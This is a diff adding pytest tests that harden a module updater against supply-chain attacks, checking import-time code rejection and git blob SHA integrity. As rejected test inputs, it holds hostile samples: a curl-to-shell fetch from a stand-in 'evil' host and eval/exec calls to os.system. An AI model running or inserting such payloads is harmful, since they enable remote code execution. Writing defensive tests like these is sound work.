@@ -367,3 +367,109 @@ def test_upgrade_all_full_system_workflow():
                             assert res["server_reload"]["connected"] is True
                             assert "diagnostics" in res
 
+
+
+# ── AUDIT run-1 C4: updater supply-chain hardening ────────────────────────────
+# The module updater downloaded remote Python and wrote it to disk after only a
+# syntactic AST check, with the manifest blob SHA never compared to the content.
+# These tests pin: (a) module-level dangerous calls are rejected before write,
+# (b) content is verified against the git blob SHA.
+
+def test_validate_module_code_rejects_import_time_shell():
+    from ares.core.updater import validate_module_code
+
+    evil = (
+        "import os\n"
+        "os.system('curl http://evil/x | sh')\n"
+        "class M:\n"
+        "    MODULE_ID = 'recon.x'\n"
+    )
+    ok, msg, _ = validate_module_code(evil)
+    assert ok is False
+    assert "import-time code execution" in msg
+
+
+def test_validate_module_code_rejects_eval_in_assignment():
+    from ares.core.updater import validate_module_code
+
+    evil = (
+        "payload = eval(\"__import__('os').system('id')\")\n"
+        "class M:\n"
+        "    MODULE_ID = 'recon.y'\n"
+    )
+    ok, msg, _ = validate_module_code(evil)
+    assert ok is False
+    assert "import-time code execution" in msg
+
+
+def test_validate_module_code_rejects_exec_in_class_body():
+    from ares.core.updater import validate_module_code
+
+    evil = (
+        "class M:\n"
+        "    MODULE_ID = 'recon.z'\n"
+        "    exec(\"import os; os.system('id')\")\n"
+    )
+    ok, msg, _ = validate_module_code(evil)
+    assert ok is False
+    assert "import-time code execution" in msg
+
+
+def test_validate_module_code_allows_dangerous_call_inside_method():
+    from ares.core.updater import validate_module_code
+
+    # os.system inside a method body is DEFERRED (runs only when the method is
+    # called, which goes through scope checks) — must not be rejected on import.
+    safe = (
+        "import os\n"
+        "class M:\n"
+        "    MODULE_ID = 'recon.safe'\n"
+        "    def execute(self):\n"
+        "        os.system('echo ok')\n"
+    )
+    ok, _msg, mid = validate_module_code(safe, 'recon.safe')
+    assert ok is True
+    assert mid == 'recon.safe'
+
+
+def test_git_blob_sha1_matches_git():
+    import hashlib
+
+    from ares.core.updater import _git_blob_sha1
+
+    data = b"print('hi')\n"
+    expected = hashlib.sha1(b"blob %d\x00" % len(data) + data).hexdigest()
+    assert _git_blob_sha1(data) == expected
+
+
+def test_download_refuses_on_blob_sha_mismatch(tmp_path):
+    from ares.core.updater import PlatformUpdateManager, SecurityViolationError, _git_blob_sha1
+
+    (tmp_path / "ares" / "modules" / "recon").mkdir(parents=True)
+    eng = PlatformUpdateManager(project_root=tmp_path)
+
+    content = b"class M:\n    MODULE_ID = 'recon.a'\n"
+    wrong_sha = _git_blob_sha1(b"different bytes entirely")
+
+    with patch.object(eng, "_http_get", return_value=content):
+        with pytest.raises(SecurityViolationError, match="Integrity check failed"):
+            eng._download_and_install_module(
+                "recon/a.py", expected_module_id=None, dry_run=False, expected_git_sha=wrong_sha
+            )
+
+
+def test_download_accepts_matching_blob_sha(tmp_path):
+    from ares.core.updater import PlatformUpdateManager, _git_blob_sha1
+
+    (tmp_path / "ares" / "modules" / "recon").mkdir(parents=True)
+    eng = PlatformUpdateManager(project_root=tmp_path)
+
+    content = b"class M:\n    MODULE_ID = 'recon.a'\n"
+    good_sha = _git_blob_sha1(content)
+
+    with patch.object(eng, "_http_get", return_value=content):
+        ok, _msg = eng._download_and_install_module(
+            "recon/a.py", expected_module_id=None, dry_run=False, expected_git_sha=good_sha
+        )
+    assert ok is True
+    assert (tmp_path / "ares" / "modules" / "recon" / "a.py").read_bytes() == content
